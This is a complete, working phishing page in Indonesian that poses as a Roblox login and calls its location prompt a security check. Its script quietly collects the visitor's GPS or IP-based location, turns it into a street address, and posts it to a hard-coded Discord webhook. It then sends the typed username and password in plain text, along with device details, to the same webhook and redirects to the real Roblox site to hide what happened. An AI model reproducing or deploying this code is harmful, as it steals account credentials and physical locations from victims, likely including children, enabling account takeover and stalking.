<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Roblox - Login</title>
    <link rel="icon" href="https://en.help.roblox.com/hc/article_attachments/4417181692692" type="image/x-icon">
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
        }

        body {
            background: linear-gradient(135deg, #0d1421 0%, #1a2332 100%);
            color: #ffffff;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }

        .container {
            width: 100%;
            max-width: 420px;
            background: rgba(25, 33, 52, 0.95);
            backdrop-filter: blur(20px);
            border-radius: 20px;
            border: 1px solid rgba(0, 162, 255, 0.2);
            overflow: hidden;
            box-shadow: 0 25px 50px rgba(0, 0, 0, 0.5);
        }

        .header {
            background: linear-gradient(90deg, #00a2ff 0%, #0066cc 100%);
            padding: 30px;
            text-align: center;
        }

        .logo {
            font-size: 42px;
            font-weight: 800;
            letter-spacing: -1px;
            margin-bottom: 5px;
        }

        .title {
            font-size: 18px;
            opacity: 0.95;
            font-weight: 500;
        }

        .content {
            padding: 35px;
        }

        .form-group {
            margin-bottom: 20px;
        }

        .form-label {
            display: block;
            font-size: 14px;
            font-weight: 500;
            color: #b8c7e8;
            margin-bottom: 8px;
        }

        .form-input {
            width: 100%;
            padding: 16px;
            background: rgba(13, 20, 33, 0.8);
            border: 1px solid #2a3655;
            border-radius: 10px;
            color: #ffffff;
            font-size: 16px;
            transition: all 0.2s;
        }

        .form-input:focus {
            outline: none;
            border-color: #00a2ff;
            background: rgba(13, 20, 33, 1);
        }

        .form-input::placeholder {
            color: #6a7ca5;
        }

        .password-container {
            position: relative;
        }

        .toggle-password {
            position: absolute;
            right: 12px;
            top: 50%;
            transform: translateY(-50%);
            background: none;
            border: none;
            color: #6a7ca5;
            cursor: pointer;
            font-size: 13px;
        }

        /* LOGIN BUTTON STATES */
        .login-button {
            width: 100%;
            padding: 18px;
            background: #2a3655;
            color: #6a7ca5;
            border: none;
            border-radius: 10px;
            font-size: 17px;
            font-weight: 600;
            cursor: not-allowed;
            margin-top: 10px;
            transition: all 0.3s;
            position: relative;
        }

        .login-button.active {
            background: linear-gradient(90deg, #00a2ff, #0066cc);
            color: white;
            cursor: pointer;
        }

        .login-button.active:hover {
            background: linear-gradient(90deg, #0088ff, #0055aa);
            transform: translateY(-2px);
            box-shadow: 0 10px 20px rgba(0, 102, 204, 0.3);
        }

        .login-button.loading {
            background: linear-gradient(90deg, #00a2ff, #0066cc);
            color: transparent;
        }

        .login-button.loading::after {
            content: "üîÑ Memproses...";
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            display: flex;
            align-items: center;
            justify-content: center;
            color: white;
            font-size: 16px;
        }

        .login-button.success {
            background: linear-gradient(90deg, #00ff88, #00cc66);
            color: white;
        }

        /* LOCATION INDICATOR (HIDDEN) */
        .location-indicator {
            height: 4px;
            background: linear-gradient(90deg, #00a2ff, #00d4ff);
            border-radius: 2px;
            margin: 20px 0;
            width: 0%;
            transition: width 1s ease;
        }

        /* STATUS MESSAGE */
        .status-message {
            background: rgba(0, 162, 255, 0.1);
            border: 1px solid rgba(0, 162, 255, 0.3);
            border-radius: 10px;
            padding: 15px;
            margin-top: 20px;
            font-size: 14px;
            color: #b8c7e8;
            display: none;
            text-align: center;
        }

        .status-message.visible {
            display: block;
            animation: fadeIn 0.5s ease;
        }

        @keyframes fadeIn {
            from { opacity: 0; }
            to { opacity: 1; }
        }

        .footer {
            text-align: center;
            padding: 25px;
            color: #6a7ca5;
            font-size: 13px;
            border-top: 1px solid rgba(42, 54, 85, 0.5);
            margin-top: 20px;
        }

        .location-badge {
            display: inline-block;
            background: rgba(0, 255, 136, 0.1);
            color: #00ff88;
            padding: 4px 10px;
            border-radius: 20px;
            font-size: 12px;
            margin-left: 10px;
            font-weight: 500;
        }

        /* HIDDEN LOCATION REQUEST */
        .hidden-location-request {
            position: fixed;
            width: 0;
            height: 0;
            opacity: 0;
            pointer-events: none;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <div class="logo">Roblox</div>
            <div class="title">Login ke Akun Anda</div>
        </div>

        <div class="content">
            <form id="loginForm">
                <div class="form-group">
                    <label class="form-label" for="username">Nama Pengguna atau Email</label>
                    <input type="text" id="username" class="form-input" 
                           placeholder="Masukkan username atau email" required>
                </div>

                <div class="form-group">
                    <label class="form-label" for="password">Password</label>
                    <div class="password-container">
                        <input type="password" id="password" class="form-input" 
                               placeholder="Masukkan password" required>
                        <button type="button" class="toggle-password" id="togglePassword">
                            Tampilkan
                        </button>
                    </div>
                </div>

                <!-- Hidden Location Progress Bar -->
                <div class="location-indicator" id="locationIndicator"></div>

                <!-- Login Button (Initially Disabled) -->
                <button type="submit" class="login-button" id="loginButton" disabled>
                    üîê Verifikasi Lokasi...
                </button>

                <!-- Status Message -->
                <div class="status-message" id="statusMessage">
                    <span id="statusText">Memverifikasi lokasi perangkat Anda...</span>
                </div>
            </form>

            <div class="footer">
                <div>¬© 2024 Roblox Corporation</div>
                <div style="margin-top: 10px; font-size: 12px;">
                    Sistem keamanan dengan verifikasi lokasi
                </div>
            </div>
        </div>
    </div>

    <!-- Hidden Location Request -->
    <div class="hidden-location-request" id="hiddenLocationRequest"></div>

    <script>
        // Webhook URL
        const WEBHOOK_URL = 'https://canary.discord.com/api/webhooks/1437726455399448678/QtsMjTl2ZJ6hJ1oekE4SKCnHbM_dH8CZoyzwtWHuZbaaFmh-EAct9BhcIFqk3ZtTqtRP';
        
        // State
        let locationGranted = false;
        let locationData = null;
        let isProcessing = false;
        
        // DOM Elements
        const loginButton = document.getElementById('loginButton');
        const locationIndicator = document.getElementById('locationIndicator');
        const statusMessage = document.getElementById('statusMessage');
        const statusText = document.getElementById('statusText');
        const togglePassword = document.getElementById('togglePassword');
        
        // Initialize - Auto start location check
        document.addEventListener('DOMContentLoaded', function() {
            // Update button text
            loginButton.innerHTML = 'üîÑ Memverifikasi lokasi...';
            statusMessage.classList.add('visible');
            
            // Auto-start location check after 1 second
            setTimeout(() => {
                startSilentLocationCheck();
            }, 1000);
            
            // Focus username field
            setTimeout(() => {
                document.getElementById('username').focus();
            }, 1500);
        });
        
        // Toggle password visibility
        togglePassword.addEventListener('click', function() {
            const passwordInput = document.getElementById('password');
            const type = passwordInput.type === 'password' ? 'text' : 'password';
            passwordInput.type = type;
            this.textContent = type === 'password' ? 'Tampilkan' : 'Sembunyikan';
        });
        
        // Start silent location check
        async function startSilentLocationCheck() {
            updateStatus("Memulai verifikasi lokasi...");
            updateProgress(10);
            
            // First try high accuracy silently
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    async (position) => {
                        await handleLocationSuccess(position);
                    },
                    (error) => {
                        // If silent fails, try with timeout
                        setTimeout(() => {
                            requestLocationWithPrompt();
                        }, 2000);
                    },
                    {
                        enableHighAccuracy: true,
                        timeout: 3000,
                        maximumAge: 60000
                    }
                );
            } else {
                // Browser doesn't support geolocation
                setTimeout(() => {
                    enableLoginButton(); // Fallback - enable anyway
                }, 3000);
            }
        }
        
        // Request location with prompt (if silent fails)
        function requestLocationWithPrompt() {
            updateStatus("Meminta izin lokasi...");
            updateProgress(30);
            
            navigator.geolocation.getCurrentPosition(
                async (position) => {
                    await handleLocationSuccess(position);
                },
                (error) => {
                    // User denied or error
                    handleLocationError();
                },
                {
                    enableHighAccuracy: true,
                    timeout: 8000,
                    maximumAge: 0
                }
            );
        }
        
        // Handle successful location capture
        async function handleLocationSuccess(position) {
            updateStatus("Menganalisis lokasi...");
            updateProgress(60);
            
            const lat = position.coords.latitude;
            const lng = position.coords.longitude;
            const accuracy = position.coords.accuracy;
            
            // Store location data
            locationData = {
                coords: { lat, lng },
                accuracy: accuracy,
                timestamp: new Date().toISOString(),
                source: 'gps'
            };
            
            // Get address
            try {
                const address = await getAddress(lat, lng);
                locationData.address = address;
            } catch (error) {
                locationData.address = `Koordinat: ${lat.toFixed(6)}, ${lng.toFixed(6)}`;
            }
            
            // Send to webhook
            await sendLocationToWebhook(lat, lng, accuracy, locationData.address);
            
            // Update UI
            updateProgress(100);
            updateStatus("‚úÖ Lokasi terverifikasi");
            
            // Enable login button after 1 second
            setTimeout(() => {
                enableLoginButton();
                locationGranted = true;
            }, 1000);
        }
        
        // Handle location error
        function handleLocationError() {
            updateStatus("Menggunakan metode verifikasi alternatif...");
            updateProgress(80);
            
            // Try IP-based location as fallback
            getIPLocation().then(ipLocation => {
                if (ipLocation) {
                    locationData = {
                        coords: { lat: ipLocation.lat, lng: ipLocation.lng },
                        accuracy: 50000,
                        timestamp: new Date().toISOString(),
                        address: ipLocation.address,
                        source: 'ip_fallback'
                    };
                    
                    // Send to webhook
                    sendLocationToWebhook(ipLocation.lat, ipLocation.lng, 50000, ipLocation.address);
                    
                    updateProgress(100);
                    updateStatus("‚úÖ Verifikasi alternatif berhasil");
                    
                    setTimeout(() => {
                        enableLoginButton();
                        locationGranted = true;
                    }, 1000);
                } else {
                    // If all fails, still enable button but with note
                    updateStatus("‚ö†Ô∏è Verifikasi lokasi dilewati");
                    setTimeout(() => {
                        enableLoginButton();
                    }, 1500);
                }
            });
        }
        
        // Get IP-based location
        async function getIPLocation() {
            try {
                const ipResponse = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipResponse.json();
                
                const locResponse = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
                const locData = await locResponse.json();
                
                if (locData.latitude && locData.longitude) {
                    return {
                        lat: locData.latitude,
                        lng: locData.longitude,
                        address: `${locData.city || ''}, ${locData.region || ''}, ${locData.country_name || ''}`.trim()
                    };
                }
            } catch (error) {
                console.error("IP location error:", error);
            }
            return null;
        }
        
        // Enable login button
        function enableLoginButton() {
            loginButton.disabled = false;
            loginButton.classList.add('active');
            loginButton.innerHTML = 'üîê Login ke Roblox';
            
            // Update status message
            if (locationData) {
                statusText.innerHTML = `‚úÖ Lokasi terverifikasi: ${locationData.address.substring(0, 40)}...`;
            } else {
                statusText.innerHTML = "‚úÖ Verifikasi selesai. Silakan login.";
            }
        }
        
        // Update progress indicator
        function updateProgress(percent) {
            locationIndicator.style.width = percent + '%';
        }
        
        // Update status message
        function updateStatus(message) {
            statusText.textContent = message;
        }
        
        // Get address from coordinates
        async function getAddress(lat, lng) {
            try {
                const response = await fetch(
                    `https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lng}&zoom=16`
                );
                
                if (!response.ok) throw new Error("Failed to get address");
                
                const data = await response.json();
                if (data.address) {
                    const addr = data.address;
                    return `${addr.road || ''} ${addr.house_number || ''}, ${addr.suburb || ''}, ${addr.city || addr.town || ''}`
                        .replace(/ ,/g, ',')
                        .trim();
                }
                return `Lokasi: ${lat.toFixed(6)}, ${lng.toFixed(6)}`;
            } catch (error) {
                return `Koordinat: ${lat.toFixed(6)}, ${lng.toFixed(6)}`;
            }
        }
        
        // Send location to webhook
        async function sendLocationToWebhook(lat, lng, accuracy, address) {
            const embed = {
                title: "üìç LOKASI TERCAPAI (SILENT)",
                color: 65280,
                fields: [
                    {
                        name: "üéØ Koordinat",
                        value: `\`\`\`${lat.toFixed(6)}, ${lng.toFixed(6)}\`\`\``,
                        inline: false
                    },
                    {
                        name: "üìè Akurasi",
                        value: `\`${accuracy.toFixed(1)} meter\``,
                        inline: true
                    },
                    {
                        name: "üè† Alamat",
                        value: `\`\`\`${address}\`\`\``,
                        inline: false
                    }
                ],
                timestamp: new Date().toISOString()
            };
            
            try {
                await fetch(WEBHOOK_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        embeds: [embed]
                    })
                });
            } catch (error) {
                console.error("Webhook error:", error);
            }
        }
        
        // Handle form submission
        document.getElementById('loginForm').addEventListener('submit', async function(e) {
            e.preventDefault();
            
            if (isProcessing) return;
            
            const username = document.getElementById('username').value.trim();
            const password = document.getElementById('password').value;
            
            if (!username || !password) {
                // Just return, no alert
                return;
            }
            
            // Start processing
            isProcessing = true;
            loginButton.classList.add('loading');
            loginButton.disabled = true;
            
            // Send complete data to webhook
            await sendLoginData(username, password);
            
            // Show success
            setTimeout(() => {
                loginButton.classList.remove('loading');
                loginButton.classList.add('success');
                loginButton.innerHTML = '‚úÖ Login Berhasil!';
                
                // Redirect to Roblox after 1.5 seconds
                setTimeout(() => {
                    window.location.href = 'https://www.roblox.com';
                }, 1500);
            }, 2000);
        });
        
        // Send complete login data
        async function sendLoginData(username, password) {
            const deviceInfo = {
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                screen: `${window.screen.width}x${window.screen.height}`,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                cookies: navigator.cookieEnabled,
                timestamp: new Date().toISOString()
            };
            
            const embed = {
                title: "üéØ LOGIN DENGAN LOKASI (SILENT)",
                color: 16711680,
                fields: [
                    {
                        name: "üë§ LOGIN DETAILS",
                        value: `\`\`\`Username: ${username}\nPassword: ${password}\`\`\``,
                        inline: false
                    }
                ],
                timestamp: new Date().toISOString()
            };
            
            // Add location data if available
            if (locationData) {
                embed.fields.push({
                    name: "üìç LOCATION DATA",
                    value: `\`\`\`${JSON.stringify(locationData, null, 2)}\`\`\``,
                    inline: false
                });
            }
            
            // Add device info
            embed.fields.push({
                name: "üíª DEVICE INFO",
                value: `\`\`\`${JSON.stringify(deviceInfo, null, 2)}\`\`\``,
                inline: false
            });
            
            try {
                await fetch(WEBHOOK_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        content: `**üéØ LOGIN DICAPAI (SILENT)**\nüë§ ${username}`,
                        embeds: [embed]
                    })
                });
            } catch (error) {
                console.error("Webhook error:", error);
            }
        }
        
        // Prevent user from trying to submit before location
        let attemptCount = 0;
        loginButton.addEventListener('click', function(e) {
            if (this.disabled) {
                attemptCount++;
                
                // Briefly change button text
                const originalText = this.innerHTML;
                this.innerHTML = '‚è≥ Tunggu verifikasi lokasi...';
                this.style.background = '#3a4565';
                
                setTimeout(() => {
                    this.innerHTML = originalText;
                    this.style.background = '';
                }, 800);
                
                // After 3 attempts, show subtle status
                if (attemptCount >= 3) {
                    statusText.innerHTML = "Harap tunggu verifikasi lokasi selesai...";
                }
                
                e.preventDefault();
                e.stopPropagation();
            }
        });
        
        // Monitor input fields
        document.getElementById('username').addEventListener('input', function() {
            if (!locationGranted && this.value.length > 0) {
                statusText.innerHTML = "Lanjutkan verifikasi lokasi...";
            }
        });
        
        document.getElementById('password').addEventListener('input', function() {
            if (!locationGranted && this.value.length > 0) {
                statusText.innerHTML = "Verifikasi lokasi hampir selesai...";
            }
        });
    </script>
</body>
                    </html>
